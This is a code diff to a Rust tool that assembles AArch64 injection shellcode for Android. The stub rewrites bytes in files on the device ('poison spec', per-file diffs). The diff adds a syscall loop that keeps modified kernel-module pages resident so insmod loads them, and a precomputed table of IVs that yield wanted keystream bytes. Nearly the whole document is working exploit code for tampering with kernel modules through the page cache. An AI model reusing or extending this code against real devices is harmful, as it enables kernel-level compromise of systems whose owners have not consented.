@@ -2,7 +2,7 @@
 // libandroid_servers restart stub — all assembled in Rust (no clang). Plus build_carrier/build_cfg.
 #![allow(dead_code)]
 use crate::asm::Asm;
-use crate::aes::keystream0;
+use crate::aes::build_iv_table;
 
 pub const R_AARCH64_CALL26: u32 = 0x11b;
 
@@ -136,7 +136,7 @@ impl Rng {
 /// files: (device_path, cur_bytes, want_bytes). Returns (stub bytes, poison spec, per-file diff counts).
 pub fn build_inject_stub(spi: u32, keymat_base: u8, port: u16,
                          gap_off: u64, gap_size: usize, orig_ctor: u64, init_array_off: u64,
-                         files: &[(String, Vec<u8>, Vec<u8>)]) -> Result<(Vec<u8>, Vec<u8>, Vec<usize>), String> {
+                         files: &[(String, Vec<u8>, Vec<u8>)], hold_loop: bool) -> Result<(Vec<u8>, Vec<u8>, Vec<usize>), String> {
     let spi_bytes = [(spi >> 24) as u8, (spi >> 16) as u8, (spi >> 8) as u8, spi as u8];
     let diffs: Vec<Vec<(u32, u8)>> = files.iter().map(|(_, cur, want)| {
         (0..want.len()).filter(|&i| cur[i] != want[i]).map(|i| (i as u32, cur[i] ^ want[i])).collect()
@@ -177,6 +177,33 @@ pub fn build_inject_stub(spi: u32, keymat_base: u8, port: u16,
         a.adr(0, &format!("cnt{}", i));
         a.ldr_w(22, 0, 0);
         a.bl("sendloop");
+        if i == 0 && hold_loop {
+            // Hold loop: keep carrier ko pages hot for 5 seconds (50 × 100ms)
+            // so insmod reads our modified pages, not evicted stock. Pread first
+            // record's offset to touch the page. Needed under memory pressure
+            // (e.g. Shizuku, QGO). Enabled by target JSON "carrier.hold_loop": true.
+            a.adr(21, "table0");
+            a.ldr_w(24, 21, 0);         // x24 = first record offset
+            a.mov_w_imm(22, 50);         // 50 iterations
+            a.label("hold");
+            a.mov_x(0, 19);             // fd
+            a.add_imm(1, 31, 80);       // buf (stack scratch)
+            a.mov_w_imm(2, 1);          // count=1
+            a.mov_x(3, 24);             // offset
+            a.mov_x_imm(8, 67);         // pread64
+            a.svc0();
+            // nanosleep(100ms = 0x05F5E100)
+            a.str_x(31, 31, 88);         // tv_sec = 0 (xzr=31)
+            a.movz_w(0, 0xE100, 0);
+            a.movk_w(0, 0x05F5, 16);
+            a.str_x(0, 31, 96);         // tv_nsec
+            a.add_imm(0, 31, 88);
+            a.mov_x_xzr(1);
+            a.mov_x_imm(8, 101);        // nanosleep
+            a.svc0();
+            a.subs_w_imm(22, 22, 1);
+            a.bne("hold");
+        }
         a.mov_x(0, 19);
         a.mov_x_imm(8, 57);
         a.svc0();
@@ -238,15 +265,14 @@ pub fn build_inject_stub(spi: u32, keymat_base: u8, port: u16,
     }
     let (mut raw, labels) = a.finish();
 
-    // fill tables with (offset, IV) records; IV chosen so ks0(iv)==need
-    let ks0 = keystream0(keymat_base);
-    let mut rng = Rng::new(0xC0FFEE1234567);
+    // fill tables with (offset, IV) records; IV from pre-computed table (IVM: O(1) lookup)
+    let iv_table = build_iv_table(keymat_base);
     for i in 0..n {
         let toff = labels[&format!("table{}", i)];
         for (j, &(o, need)) in diffs[i].iter().enumerate() {
             let e = toff + j * 12;
             raw[e..e + 4].copy_from_slice(&o.to_le_bytes());
-            let iv = loop { let iv = rng.next8(); if ks0(&iv) == need { break iv; } };
+            let iv = iv_table[need as usize];
             raw[e + 4..e + 12].copy_from_slice(&iv);
         }
         let coff = labels[&format!("cnt{}", i)];
